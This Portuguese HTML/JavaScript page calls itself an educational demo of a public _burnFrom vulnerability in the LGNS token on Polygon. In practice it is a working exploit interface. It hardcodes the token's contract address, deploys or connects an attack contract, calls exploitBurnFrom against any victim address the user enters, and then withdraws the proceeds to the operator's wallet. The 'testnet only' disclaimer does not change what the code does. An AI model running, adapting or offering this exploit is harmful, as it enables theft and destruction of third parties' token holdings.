<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demo Educacional - Vulnerabilidade Token LGNS</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bignumber.js@9.1.0/bignumber.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .warning h3 {
            color: #856404;
            margin-bottom: 10px;
        }
        
        .section {
            margin-bottom: 25px;
            padding: 20px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
        }
        
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 2.2em;
        }
        
        h2 {
            color: #495057;
            margin-bottom: 15px;
            border-bottom: 2px solid #667eea;
            padding-bottom: 5px;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #495057;
        }
        
        input, button, select {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        
        input:focus, select:focus {
            border-color: #667eea;
            outline: none;
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
            transition: transform 0.2s;
            margin-top: 10px;
        }
        
        button:hover {
            transform: translateY(-2px);
        }
        
        button:disabled {
            background: #6c757d;
            cursor: not-allowed;
            transform: none;
        }
        
        .result {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 10px;
            border-left: 4px solid #667eea;
        }
        
        .status {
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 15px;
        }
        
        .connected {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .disconnected {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .info-box {
            background: #e7f3ff;
            border: 1px solid #b3d9ff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }
        
        .quick-actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 10px;
        }
        
        .quick-btn {
            padding: 8px;
            font-size: 14px;
        }
        
        .balance-display {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            border-radius: 5px;
            padding: 10px;
            margin-top: 5px;
            text-align: center;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîì Demo Educacional - Vulnerabilidade Token LGNS</h1>
        
        <div class="warning">
            <h3>‚ö†Ô∏è AVISO IMPORTANTE</h3>
            <p>Esta √© uma demonstra√ß√£o EDUCACIONAL para mostrar vulnerabilidades de seguran√ßa.</p>
            <p><strong>N√ÉO USE EM REDE PRINCIPAL (MAINNET)</strong></p>
            <p>Use apenas em redes de teste para fins de aprendizado.</p>
        </div>

        <div class="section">
            <h2>üîó Conex√£o com a Rede</h2>
            <div id="connectionStatus" class="status disconnected">
                Desconectado da Rede Polygon
            </div>
            <button onclick="connectWallet()">Conectar Carteira</button>
            <div class="info-box">
                <strong>Endere√ßo do Contrato Vulner√°vel:</strong><br>
                0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01
            </div>
            
            <div class="input-group">
                <label>Seu Saldo de MATIC:</label>
                <div id="maticBalance" class="balance-display">-</div>
            </div>
        </div>

        <div class="section">
            <h2>üìä Verifica√ß√µes de Seguran√ßa</h2>
            
            <div class="input-group">
                <label>Endere√ßo para Verificar Saldo LGNS:</label>
                <input type="text" id="balanceAddress" placeholder="0x...">
                <button onclick="checkBalance()">Verificar Saldo LGNS</button>
                <div id="balanceResult" class="result"></div>
            </div>
            
            <div class="input-group">
                <label>Verificar Permiss√µes (Allowance):</label>
                <input type="text" id="ownerAddress" placeholder="Dono dos tokens (0x...)">
                <input type="text" id="spenderAddress" placeholder="Quem tem permiss√£o (0x...)" style="margin-top: 10px;">
                <button onclick="checkAllowance()">Verificar Permiss√£o</button>
                <div id="allowanceResult" class="result"></div>
            </div>
        </div>

        <div class="section">
            <h2>üéØ Demonstra√ß√£o da Vulnerabilidade</h2>
            <div class="info-box">
                <strong>Vulnerabilidade:</strong> Fun√ß√£o _burnFrom p√∫blica<br>
                <strong>Risco:</strong> Permite queimar tokens de outros endere√ßos
            </div>
            
            <div class="input-group">
                <label>Endere√ßo do Contrato V√≠tima:</label>
                <input type="text" id="victimAddress" placeholder="0x... (contrato com LGNS)">
            </div>
            
            <div class="input-group">
                <label>Quantidade de LGNS para Demonstrar:</label>
                <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 10px;">
                    <input type="number" id="attackAmount" placeholder="Ex: 100" step="0.1" min="0.1">
                    <select id="amountUnit">
                        <option value="lgns">LGNS</option>
                        <option value="wei">Wei</option>
                    </select>
                </div>
                
                <div class="quick-actions">
                    <button class="quick-btn" onclick="setAmount(1)">1 LGNS</button>
                    <button class="quick-btn" onclick="setAmount(10)">10 LGNS</button>
                    <button class="quick-btn" onclick="setAmount(100)">100 LGNS</button>
                    <button class="quick-btn" onclick="setAmount(1000)">1000 LGNS</button>
                </div>
            </div>
            
            <button onclick="executeDemo()" id="demoButton">Executar Demonstra√ß√£o</button>
            <div id="demoResult" class="result"></div>
        </div>

        <div class="section">
            <h2>üí∞ Gerenciamento de Fundos</h2>
            
            <div class="input-group">
                <label>Seu Saldo de LGNS no Contrato de Ataque:</label>
                <div id="contractBalance" class="balance-display">-</div>
                <button onclick="checkContractBalance()">Atualizar Saldo</button>
            </div>
            
            <div class="quick-actions">
                <button onclick="withdrawTokens()" class="quick-btn">Retirar LGNS para Minha Carteira</button>
                <button onclick="withdrawFunds()" class="quick-btn">Retirar MATIC</button>
            </div>
        </div>

        <div class="section">
            <h2>üìù Contrato de Ataque</h2>
            <div id="contractInfo" class="result">
                Aguardando implanta√ß√£o do contrato...
            </div>
            
            <div class="input-group">
                <label>Endere√ßo do Seu Contrato (se j√° implantado):</label>
                <input type="text" id="contractAddress" placeholder="0x... (cole aqui se j√° tiver contrato)">
                <button onclick="connectExistingContract()">Conectar ao Contrato Existente</button>
            </div>
            
            <button onclick="deployContract()" id="deployButton">Implantar Novo Contrato Demo</button>
        </div>
    </div>

    <script>
        let web3;
        let userAccount;
        let attackContract;
        let attackContractAddress;

        // ABI do Contrato de Ataque (mesmo do anterior)
        const ATTACK_ABI = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "anonymous": false,
                "inputs": [
                    {
                        "indexed": true,
                        "internalType": "address",
                        "name": "victim",
                        "type": "address"
                    },
                    {
                        "indexed": false,
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "AttackExecuted",
                "type": "event"
            },
            {
                "anonymous": false,
                "inputs": [
                    {
                        "indexed": true,
                        "internalType": "address",
                        "name": "from",
                        "type": "address"
                    },
                    {
                        "indexed": false,
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "FundsReceived",
                "type": "event"
            },
            {
                "inputs": [],
                "name": "VULNERABLE_TOKEN",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "attackExecuted",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "victimContract",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "exploitBurnFrom",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "stolenAmount",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "account",
                        "type": "address"
                    }
                ],
                "name": "checkBalance",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "spender",
                        "type": "address"
                    }
                ],
                "name": "checkAllowance",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawFunds",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            }
        ];

        // ABI simplificada do Token Vulner√°vel
        const TOKEN_ABI = [
            {
                "constant": false,
                "inputs": [
                    {"name": "account_", "type": "address"},
                    {"name": "amount_", "type": "uint256"}
                ],
                "name": "_burnFrom",
                "outputs": [],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{"name": "account", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [
                    {"name": "owner", "type": "address"},
                    {"name": "spender", "type": "address"}
                ],
                "name": "allowance",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "spender", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];

        const VULNERABLE_TOKEN = "0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01";

        // Fun√ß√µes para facilitar o uso
        function setAmount(amount) {
            document.getElementById('attackAmount').value = amount;
        }

        function convertToWei(amount, unit) {
            if (unit === 'wei') {
                return amount;
            }
            // LGNS tem 9 decimais (conforme o contrato)
            return new BigNumber(amount).times(1e9).toString();
        }

        function convertFromWei(amount) {
            return new BigNumber(amount).dividedBy(1e9).toString();
        }

        async function connectWallet() {
            try {
                if (window.ethereum) {
                    web3 = new Web3(window.ethereum);
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    
                    document.getElementById('connectionStatus').className = 'status connected';
                    document.getElementById('connectionStatus').innerHTML = 
                        `Conectado: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
                    
                    // Atualizar saldo de MATIC
                    await updateMaticBalance();
                    
                    // Verificar se j√° tem contrato salvo
                    const savedContract = localStorage.getItem('attackContractAddress');
                    if (savedContract) {
                        document.getElementById('contractAddress').value = savedContract;
                        await connectExistingContract();
                    }
                    
                } else {
                    alert('Por favor, instale o MetaMask!');
                }
            } catch (error) {
                console.error('Erro ao conectar:', error);
                alert('Erro ao conectar carteira: ' + error.message);
            }
        }

        async function updateMaticBalance() {
            if (!web3 || !userAccount) return;
            
            try {
                const balance = await web3.eth.getBalance(userAccount);
                const maticBalance = web3.utils.fromWei(balance, 'ether');
                document.getElementById('maticBalance').innerHTML = `${parseFloat(maticBalance).toFixed(4)} MATIC`;
            } catch (error) {
                console.error('Erro ao buscar saldo:', error);
            }
        }

        async function connectExistingContract() {
            const contractAddress = document.getElementById('contractAddress').value;
            
            if (!web3 || !userAccount) {
                alert('Conecte sua carteira primeiro!');
                return;
            }

            if (!contractAddress) {
                alert('Digite o endere√ßo do contrato!');
                return;
            }

            try {
                attackContractAddress = contractAddress;
                attackContract = new web3.eth.Contract(ATTACK_ABI, attackContractAddress);
                
                // Verificar se √© dono do contrato
                const owner = await attackContract.methods.owner().call();
                if (owner.toLowerCase() !== userAccount.toLowerCase()) {
                    alert('AVISO: Voc√™ n√£o √© o dono deste contrato!');
                }
                
                document.getElementById('contractInfo').innerHTML = 
                    `<strong>Contrato Conectado:</strong><br>${attackContractAddress}<br>
                     <strong>Dono:</strong> ${owner}`;
                
                // Salvar no localStorage
                localStorage.setItem('attackContractAddress', contractAddress);
                
                // Atualizar saldo do contrato
                await checkContractBalance();
                
            } catch (error) {
                console.error('Erro ao conectar contrato:', error);
                alert('Erro ao conectar contrato: ' + error.message);
            }
        }

        async function deployContract() {
            if (!web3 || !userAccount) {
                alert('Conecte sua carteira primeiro!');
                return;
            }

            try {
                document.getElementById('deployButton').disabled = true;
                document.getElementById('deployButton').innerText = 'Implantando...';

                // Nota: Voc√™ precisa compilar o contrato e colocar o bytecode aqui
                const contractBytecode = 'SEU_BYTECODE_AQUI'; // Substituir pelo bytecode real
                
                if (contractBytecode === 'SEU_BYTECODE_AQUI') {
                    alert('Por favor, compile o contrato e insira o bytecode no c√≥digo!');
                    return;
                }

                const contract = new web3.eth.Contract(ATTACK_ABI);
                
                const deployTx = contract.deploy({
                    data: contractBytecode
                });

                const gasEstimate = await deployTx.estimateGas({ from: userAccount });
                
                const deployedContract = await deployTx.send({
                    from: userAccount,
                    gas: gasEstimate
                });

                attackContractAddress = deployedContract.options.address;
                attackContract = new web3.eth.Contract(ATTACK_ABI, attackContractAddress);
                
                document.getElementById('contractInfo').innerHTML = 
                    `<strong>Contrato Implantado:</strong><br>${attackContractAddress}`;
                
                document.getElementById('contractAddress').value = attackContractAddress;
                localStorage.setItem('attackContractAddress', attackContractAddress);
                
                document.getElementById('deployButton').innerText = 'Contrato Implantado!';
                
                await checkContractBalance();
                
            } catch (error) {
                console.error('Erro na implanta√ß√£o:', error);
                alert('Erro ao implantar contrato: ' + error.message);
                document.getElementById('deployButton').disabled = false;
                document.getElementById('deployButton').innerText = 'Implantar Contrato Demo';
            }
        }

        async function checkBalance() {
            if (!web3) {
                alert('Conecte sua carteira primeiro!');
                return;
            }

            const address = document.getElementById('balanceAddress').value;
            if (!address) {
                alert('Digite um endere√ßo!');
                return;
            }

            try {
                const tokenContract = new web3.eth.Contract(TOKEN_ABI, VULNERABLE_TOKEN);
                const balance = await tokenContract.methods.balanceOf(address).call();
                const balanceInLGNS = convertFromWei(balance);
                
                document.getElementById('balanceResult').innerHTML = 
                    `Saldo: ${parseFloat(balanceInLGNS).toLocaleString('pt-BR')} LGNS<br>
                     <small>(${balance} wei)</small>`;
            } catch (error) {
                console.error('Erro:', error);
                document.getElementById('balanceResult').innerHTML = 'Erro ao verificar saldo';
            }
        }

        async function checkAllowance() {
            if (!web3) {
                alert('Conecte sua carteira primeiro!');
                return;
            }

            const owner = document.getElementById('ownerAddress').value;
            const spender = document.getElementById('spenderAddress').value;
            
            if (!owner || !spender) {
                alert('Preencha ambos os endere√ßos!');
                return;
            }

            try {
                const tokenContract = new web3.eth.Contract(TOKEN_ABI, VULNERABLE_TOKEN);
                const allowance = await tokenContract.methods.allowance(owner, spender).call();
                const allowanceInLGNS = convertFromWei(allowance);
                
                document.getElementById('allowanceResult').innerHTML = 
                    `Permiss√£o: ${parseFloat(allowanceInLGNS).toLocaleString('pt-BR')} LGNS<br>
                     <small>(${allowance} wei)</small>`;
            } catch (error) {
                console.error('Erro:', error);
                document.getElementById('allowanceResult').innerHTML = 'Erro ao verificar permiss√£o';
            }
        }

        async function checkContractBalance() {
            if (!web3 || !attackContract) {
                alert('Conecte ao contrato primeiro!');
                return;
            }

            try {
                const balance = await attackContract.methods.checkBalance(attackContractAddress).call();
                const balanceInLGNS = convertFromWei(balance);
                
                document.getElementById('contractBalance').innerHTML = 
                    `${parseFloat(balanceInLGNS).toLocaleString('pt-BR')} LGNS`;
            } catch (error) {
                console.error('Erro:', error);
                document.getElementById('contractBalance').innerHTML = 'Erro ao verificar saldo';
            }
        }

        async function executeDemo() {
            if (!web3 || !userAccount || !attackContract) {
                alert('Conecte carteira e contrato primeiro!');
                return;
            }

            const victimAddress = document.getElementById('victimAddress').value;
            const amount = document.getElementById('attackAmount').value;
            const unit = document.getElementById('amountUnit').value;
            
            if (!victimAddress || !amount) {
                alert('Preencha todos os campos!');
                return;
            }

            try {
                document.getElementById('demoButton').disabled = true;
                document.getElementById('demoButton').innerText = 'Executando...';

                const amountInWei = convertToWei(amount, unit);
                
                // Executa a demonstra√ß√£o do ataque
                await attackContract.methods.exploitBurnFrom(victimAddress, amountInWei)
                    .send({ from: userAccount });
                
                document.getElementById('demoResult').innerHTML = 
                    '‚úÖ Demonstra√ß√£o executada com sucesso!<br>' +
                    `V√≠tima: ${victimAddress}<br>` +
                    `Quantidade: ${parseFloat(amount).toLocaleString('pt-BR')} LGNS<br>
                     <small>Transa√ß√£o confirmada - Tokens queimados do contrato v√≠tima</small>`;
                
                // Atualizar saldo do contrato
                await checkContractBalance();
                
            } catch (error) {
                console.error('Erro na demonstra√ß√£o:', error);
                document.getElementById('demoResult').innerHTML = 
                    '‚ùå Erro na demonstra√ß√£o: ' + error.message;
            } finally {
                document.getElementById('demoButton').disabled = false;
                document.getElementById('demoButton').innerText = 'Executar Demonstra√ß√£o';
            }
        }

        async function withdrawTokens() {
            if (!web3 || !userAccount || !attackContract) {
                alert('Conecte carteira e contrato primeiro!');
                return;
            }

            try {
                await attackContract.methods.withdrawTokens().send({ from: userAccount });
                alert('‚úÖ LGNS retirados para sua carteira!');
                await checkContractBalance();
            } catch (error) {
                console.error('Erro ao retirar tokens:', error);
                alert('Erro ao retirar tokens: ' + error.message);
            }
        }

        async function withdrawFunds() {
            if (!web3 || !userAccount || !attackContract) {
                alert('Conecte carteira e contrato primeiro!');
                return;
            }

            try {
                await attackContract.methods.withdrawFunds().send({ from: userAccount });
                alert('‚úÖ MATIC retirados para sua carteira!');
                await updateMaticBalance();
            } catch (error) {
                console.error('Erro ao retirar fundos:', error);
                alert('Erro ao retirar fundos: ' + error.message);
            }
        }

        // Inicializa√ß√£o
        window.addEventListener('load', async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
            }
        });
    </script>
</body>
</html>
